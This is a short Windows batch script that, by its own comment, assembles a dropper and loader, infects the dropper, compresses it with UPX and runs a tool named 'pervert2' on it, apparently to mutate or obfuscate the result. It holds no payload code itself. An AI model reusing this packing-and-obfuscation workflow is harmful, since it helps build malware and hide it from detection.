:: assemble dropper & loader, infect dropper and pack it, then pervert
@echo off
call asmtest
call infect
x:\exe\upx\upx.exe -9 --force test.exe
x:\exe\pervert2.exe test.exe -m2 -m3
